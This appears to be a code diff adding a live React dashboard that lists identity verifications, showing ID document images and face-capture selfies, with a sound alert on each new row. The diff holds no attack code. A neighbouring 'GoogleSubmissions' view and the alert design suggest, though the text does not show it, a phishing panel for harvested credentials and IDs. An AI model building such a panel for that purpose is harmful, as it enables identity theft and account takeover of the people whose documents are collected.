@@ -671,3 +671,182 @@ function GoogleSubmissions({ playSound }: { playSound: () => void }) {
     </div>
   );
 }
+
+type IdentityRow = {
+  id: string;
+  session_id: string;
+  doc_type: string | null;
+  doc_image_url: string | null;
+  face_look_url: string | null;
+  face_blink_url: string | null;
+  face_right_url: string | null;
+  face_left_url: string | null;
+  current_step: string | null;
+  status: string;
+  user_agent: string | null;
+  created_at: string;
+  updated_at: string;
+};
+
+const DOC_LABEL: Record<string, string> = {
+  nid: "National ID",
+  license: "Driving License",
+  passport: "Passport",
+};
+
+function IdentityVerifications({ playSound }: { playSound: () => void }) {
+  const [rows, setRows] = useState<IdentityRow[]>([]);
+  const [preview, setPreview] = useState<string | null>(null);
+
+  useEffect(() => {
+    supabase
+      .from("identity_verifications")
+      .select("*")
+      .order("updated_at", { ascending: false })
+      .then(({ data }) => {
+        if (data) setRows(data as IdentityRow[]);
+      });
+
+    const channel = supabase
+      .channel("identity_verifications_changes")
+      .on(
+        "postgres_changes",
+        { event: "*", schema: "public", table: "identity_verifications" },
+        (payload) => {
+          playSound();
+          setRows((prev) => {
+            if (payload.eventType === "DELETE") {
+              return prev.filter((r) => r.id !== (payload.old as IdentityRow).id);
+            }
+            const next = payload.new as IdentityRow;
+            const idx = prev.findIndex((r) => r.id === next.id);
+            if (idx === -1) return [next, ...prev];
+            const copy = [...prev];
+            copy[idx] = next;
+            return [copy[idx], ...copy.filter((_, i) => i !== idx)];
+          });
+        }
+      )
+      .subscribe();
+
+    return () => {
+      supabase.removeChannel(channel);
+    };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
+  const FACE_LABELS: { key: keyof IdentityRow; label: string }[] = [
+    { key: "face_look_url", label: "Look" },
+    { key: "face_blink_url", label: "Blink" },
+    { key: "face_right_url", label: "Right" },
+    { key: "face_left_url", label: "Left" },
+  ];
+
+  return (
+    <div>
+      <p className="mb-4 text-sm text-muted-foreground">
+        {rows.length} identity verification{rows.length !== 1 && "s"} · live
+      </p>
+
+      {rows.length === 0 ? (
+        <div className="rounded-2xl border border-dashed border-border bg-card p-12 text-center">
+          <p className="text-muted-foreground">Waiting for identity verifications…</p>
+        </div>
+      ) : (
+        <div className="grid gap-4 md:grid-cols-2 xl:grid-cols-3">
+          {rows.map((r) => (
+            <article key={r.id} className="rounded-2xl border border-border bg-card p-5 shadow-sm transition hover:shadow-md">
+              <div className="mb-4 flex items-center justify-between">
+                <span className="rounded-full bg-primary/10 px-2.5 py-1 font-mono text-[10px] text-primary">
+                  {r.session_id.slice(0, 8)}
+                </span>
+                <div className="flex items-center gap-2">
+                  <span className={`rounded-full px-2 py-0.5 text-[10px] font-semibold ${
+                    r.status === "completed"
+                      ? "bg-[oklch(0.78_0.16_150/0.15)] text-[oklch(0.78_0.16_150)]"
+                      : "bg-amber-500/15 text-amber-500"
+                  }`}>
+                    {r.status}
+                  </span>
+                  <span className="flex items-center gap-1 text-[11px] text-muted-foreground">
+                    <Clock className="h-3 w-3" />
+                    {new Date(r.updated_at).toLocaleTimeString()}
+                  </span>
+                  <button
+                    onClick={async () => {
+                      if (!confirm("Delete this verification?")) return;
+                      await supabase.from("identity_verifications").delete().eq("id", r.id);
+                      setRows((prev) => prev.filter((x) => x.id !== r.id));
+                    }}
+                    className="rounded-md p-1 text-destructive transition hover:bg-destructive/10"
+                  >
+                    <Trash2 className="h-3.5 w-3.5" />
+                  </button>
+                </div>
+              </div>
+
+              <section className="mb-4">
+                <h3 className="mb-2 flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
+                  <ShieldCheck className="h-3.5 w-3.5" /> Document
+                </h3>
+                <dl className="space-y-1.5 text-sm">
+                  <Field label="Type" value={r.doc_type ? DOC_LABEL[r.doc_type] || r.doc_type : null} />
+                  <Field label="Step" value={r.current_step} />
+                </dl>
+                {r.doc_image_url ? (
+                  <button
+                    onClick={() => setPreview(r.doc_image_url)}
+                    className="mt-3 block w-full overflow-hidden rounded-xl border border-border bg-muted"
+                  >
+                    <img src={r.doc_image_url} alt="ID document" className="max-h-48 w-full object-contain" />
+                  </button>
+                ) : (
+                  <div className="mt-3 grid h-32 place-items-center rounded-xl border border-dashed border-border text-[11px] text-muted-foreground">
+                    No document yet
+                  </div>
+                )}
+              </section>
+
+              <section>
+                <h3 className="mb-2 flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
+                  <Camera className="h-3.5 w-3.5" /> Face Captures
+                </h3>
+                <div className="grid grid-cols-4 gap-2">
+                  {FACE_LABELS.map((f) => {
+                    const url = r[f.key] as string | null;
+                    return (
+                      <div key={f.key} className="flex flex-col items-center gap-1">
+                        {url ? (
+                          <button
+                            onClick={() => setPreview(url)}
+                            className="aspect-square w-full overflow-hidden rounded-lg border border-border bg-muted"
+                          >
+                            <img src={url} alt={f.label} className="h-full w-full object-cover" />
+                          </button>
+                        ) : (
+                          <div className="grid aspect-square w-full place-items-center rounded-lg border border-dashed border-border">
+                            <Camera className="h-4 w-4 text-muted-foreground/50" />
+                          </div>
+                        )}
+                        <span className="text-[10px] text-muted-foreground">{f.label}</span>
+                      </div>
+                    );
+                  })}
+                </div>
+              </section>
+            </article>
+          ))}
+        </div>
+      )}
+
+      {preview && (
+        <div
+          onClick={() => setPreview(null)}
+          className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-6"
+        >
+          <img src={preview} alt="" className="max-h-[90vh] max-w-[90vw] rounded-xl object-contain" />
+        </div>
+      )}
+    </div>
+  );
+}
